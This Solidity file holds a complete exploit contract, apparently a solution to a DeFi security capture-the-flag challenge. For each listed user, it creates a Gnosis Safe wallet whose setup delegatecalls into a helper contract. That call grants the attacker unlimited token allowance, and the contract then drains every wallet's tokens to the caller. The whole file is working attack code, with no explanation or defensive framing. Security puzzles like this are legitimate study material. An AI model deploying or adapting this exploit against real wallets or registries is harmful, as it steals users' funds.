// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker {

    constructor(address[] memory users, address factory, address mastercopy, IERC20 token, IProxyCreationCallback callbackAddress) {
        ///// Deploy callee contract
        BackdoorAttackerDelegateCallee delegateCallee = new BackdoorAttackerDelegateCallee();
        ///// Create data of setupModule's delegatacall
        address delegateTo = address(delegateCallee);
        bytes memory data = abi.encodeWithSelector(
            BackdoorAttackerDelegateCallee.giveAllowance.selector,
            address(token),
            address(this),
            type(uint256).max
        );
        ///// Exploit
        GnosisSafeProxyFactory _factory = GnosisSafeProxyFactory(factory);
        for(uint256 i=0;i<users.length;++i){
            address[] memory _owners = new address[](1);
            _owners[0] = users[i];
            GnosisSafeProxy gsproxy = _factory.createProxyWithCallback(
                mastercopy,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    _owners,          //_owners
                    1,                //_threshold
                    delegateTo,       //to
                    data,             //data
                    address(0),       //fallbackHandler
                    address(0),       //paymentToken
                    0,                //payment
                    address(0)        //paymentReceiver
                ),
                1337, ///nonce
                callbackAddress
            );
            require(token.balanceOf(address(gsproxy)) == 10 ether, "exploit: infficient balance");
            require(token.allowance(address(gsproxy), address(this)) >= 10 ether, "exploit: infficient allowance");
            token.transferFrom(address(gsproxy), address(this), 10 ether);
        }
        token.transfer(msg.sender, users.length * 10 ether);
    }
   
}

contract BackdoorAttackerDelegateCallee {
     function giveAllowance(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }
}